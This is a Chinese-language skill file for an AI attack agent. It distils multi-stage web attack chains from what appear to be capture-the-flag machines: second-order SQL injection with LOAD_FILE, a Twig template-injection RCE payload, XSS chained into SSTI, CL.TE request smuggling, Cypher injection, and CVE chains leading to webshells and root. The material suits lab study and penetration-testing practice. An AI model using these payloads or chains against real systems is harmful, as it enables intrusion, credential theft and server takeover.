---
name: 'web-chained-attacks'
description: 'Web链式攻击抽象：XSS→SSTI(Cobblestone)；HTTP Smuggling→Session Hijack(Sink)；Cypher注入→WebAuthn XSS→Kafka→FreeIPA(Sorcery)。'
whenToUse: '设计多步攻击链时参考既有链式组合与衔接技巧。'
metadata: { domain: web, tier: T1 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

# Web 链式多阶段攻击抽象

> 从 Cobblestone(Insane)、Sink(Insane)、Sorcery(Insane) 三条完整攻击链中抽象出的通用模式。每条链都跨越多层：注入→文件读/SSRF→认证窃取→后续注入→提权。

## 模式 A：Second-Order 注入 + 文件读取 + XSS → SSTI（Cobblestone）

```
Stage 1: Second-Order SQLi
  入口: vote.cobblestone.htb/suggest.php
  INSERT 用 prepared statement（安全）
  → details.php 第二个查询用字符串拼接（注入点）
  UNION SELECT 1,2,LOAD_FILE('/path'),4,5-- -

Stage 2: MySQL LOAD_FILE
  条件：FILE privilege
  效果：读源码(PHP/Twig) / Apache config / composer.json
  
Stage 3: XSS 直接调用 SSTI（不偷 cookie！）
  suggest.html.twig 使用 |raw 过滤器 → XSS
  🔴 XSS payload 在 admin 浏览器中直接 fetch('/preview_banner.php',
     {first: SSTI_payload}) → Twig 渲染 → RCE
  不经过 cookie 盗窃步骤！

Stage 4: SSTI → RCE
  Twig: {{_self.env.registerUndefinedFilterCallback("system")}}
        {{_self.env.getFilter("id")}}
```

### 🎯 XSS→SSTI 直接链（关键创新）
```
传统思路: XSS → 偷cookie → 自己发SSTI (多一步)
正确思路: XSS → admin浏览器直接调用SSTI endpoint → 结果外带
          一步到位，不需要cookie离开admin浏览器
```

### 通用检测清单
```
[ ] 每个输入字段是否在后续页面渲染？→ Second-Order 候选
[ ] 渲染时是否嵌入 SQL / HTML / 模板？
[ ] MySQL FILE privilege 存在？→ LOAD_FILE 可用
[ ] 管理面板用 |raw 或 autoescape=false？→ XSS
[ ] 管理面板是否有内部 API 接受模板表达式？→ SSTI
[ ] XSS 能否直接调用 SSTI endpoint？→ 跳过cookie盗窃
```

## 模式 B：HTTP Request Smuggling → Session Hijack（Sink）

```
Stage 1: Proxy-Backend Desync
  条件：HAProxy fronting Gunicorn/其他后端
  类型：CL.TE（Content-Length vs Transfer-Encoding 不一致）
  Payload: Content-Length: 5\r\n\r\n0\r\n\r\n + 走私请求
  
Stage 2: Session Cookie Theft
  走私 GET /admin → 响应包含 admin cookie
  重用 cookie → 认证为 admin

Stage 3: 云凭据链
  Admin panel → Gitea repo → git history → AWS keys
  AWS IAM → Secrets Manager → KMS decrypt → Root creds
```

## 模式 C：图数据库注入 + WebAuthn XSS + 消息队列 + LDAP（Sorcery）

```
Stage 1: Cypher Injection（Neo4j）
  闭合引号 + UNION MATCH 读取任意节点
  
Stage 2: WebAuthn Passkey Registration XSS
  credential.name 不转义 → 注入JS自动完成 WebAuthn 注册
  → 攻击者认证器关联到 admin 账户

Stage 3: Kafka Wire Protocol
  HTTP 网关转发 TCP 字节 → 手工构造 Kafka 协议包
  ApiVersions(18) → DescribeTopic(75) → Fetch(1)

Stage 4: FreeIPA (Linux AD)
  HBAC rules + sudo rules + ipa-getkeytab
```

## 模式 D：Mirth Connect → Localhost Service → Eval（Interpreter）

```
CVE-2023-43208 XStream Deserialization → RCE as mirth
→ mirth.properties 明文 DB 密码 → hash cracking → SSH
→ localhost root Python service eval() 注入 → root
```

## 模式 E：Git 泄露 + 字体工具链 CVE + setuptools（VariaType）

```
.git/ disclosure → git log -p → 删除的 commit 中有密码
→ CVE-2025-66034 fontTools CDATA injection → 写 webshell
→ CVE-2025-47273 setuptools path traversal → root
```

## 通用教训

1. **每一个 vhost 是独立攻击面**：ffuf 子域名发现
2. **Second-Order 注入扫描器容易漏**：追踪每个存储字段的后续渲染
3. **"本地"服务不安全**：localhost-only ≠ 安全
4. **XSS 可以直接调用 SSTI**：不需要偷 cookie 这一步
5. **|raw 过滤器 = XSS 红旗**：管理面板用 |raw 渲染用户输入直接打
